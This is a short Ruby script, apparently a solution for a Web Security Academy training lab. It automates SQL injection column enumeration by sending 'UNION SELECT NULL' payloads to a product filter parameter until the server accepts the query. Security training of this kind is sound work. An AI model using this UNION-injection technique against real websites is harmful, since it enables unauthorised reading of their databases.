require 'http'
 
cols = ['NULL']
status=500

client = HTTP.headers(
		"User-Agent"=>"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36"
).cookies(
		"session" => "zKC1QJlj6EENCXlMGACrAVQMl03YPnYS"
)


def get_status(cols) 
	url = "https://0a4b00c903256d8680c10dec00ae00da.web-security-academy.net/filter"
	payload = "Gifts' UNION SELECT #{cols.join(',')}-- -"
	client = HTTP.get url,:params => {"category"=>"#{payload}"}
	return client.status
end

until status==200
	status=get_status(cols)
	print "Columns : #{cols.length}"
	puts " : #{status}"
	cols << "NULL"
end

puts "Number of columns: #{cols.count-1}"
